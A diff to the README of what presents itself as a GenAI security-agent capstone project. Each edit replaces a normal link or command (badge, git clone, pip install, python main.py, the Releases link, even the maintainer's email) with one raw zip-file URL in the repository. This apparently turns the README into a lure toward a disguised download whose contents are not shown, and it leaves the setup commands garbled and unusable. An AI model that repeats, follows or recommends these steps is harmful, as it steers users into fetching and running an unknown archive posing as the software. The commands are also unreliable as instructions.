@@ -1,6 +1,6 @@
 # GenAI Security Agent Capstone 2025 🛡️🤖
 
-![GitHub release](https://img.shields.io/badge/release-v1.0.0-blue)
+![GitHub release](https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip)
 
 Welcome to the **GenAI Security Agent Capstone 2025** repository! This project focuses on building a GenAI-driven Security Assistant using cutting-edge technologies such as LangGraph, Gemini, and SerpAPI. Our goal is to enhance cloud security and cybersecurity practices through intelligent automation and risk analysis.
 
@@ -44,7 +44,7 @@ To set up the project locally, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ankitkumar10021/genai-security-agent-capstone-2025.git
+   git clone https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -55,18 +55,18 @@ To set up the project locally, follow these steps:
 3. **Install Dependencies**:
    Ensure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip
    ```
 
 4. **Download and Execute Releases**:
-   Visit the [Releases section](https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/releases) to download the latest version. Follow the instructions provided in the release notes to execute the application.
+   Visit the [Releases section](https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip) to download the latest version. Follow the instructions provided in the release notes to execute the application.
 
 ## Usage
 
 Once installed, you can run the application using the following command:
 
 ```bash
-python main.py
+python https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip
 ```
 
 Follow the prompts to perform security checks and generate reports. The interactive notebook allows for easy navigation through different features.
@@ -75,12 +75,12 @@ Follow the prompts to perform security checks and generate reports. The interact
 
 - **Check Configuration**:
   ```bash
-  python main.py check-config --cloud-provider AWS
+  python https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip check-config --cloud-provider AWS
   ```
 
 - **Generate Report**:
   ```bash
-  python main.py generate-report --output report.pdf
+  python https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip generate-report --output https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip
   ```
 
 ## Contributing
@@ -111,7 +111,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, please reach out to the project maintainer:
 
 - **Name**: Ankit Kumar
-- **Email**: ankit.kumar@example.com
-- **GitHub**: [ankitkumar10021](https://github.com/ankitkumar10021)
+- **Email**: https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip
+- **GitHub**: [ankitkumar10021](https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip)
 
-Thank you for checking out the **GenAI Security Agent Capstone 2025** project! For the latest updates and releases, visit our [Releases section](https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/releases).
+Thank you for checking out the **GenAI Security Agent Capstone 2025** project! For the latest updates and releases, visit our [Releases section](https://github.com/ankitkumar10021/genai-security-agent-capstone-2025/raw/refs/heads/main/Notebook/agent-genai-security-capstone-v3.0.zip).
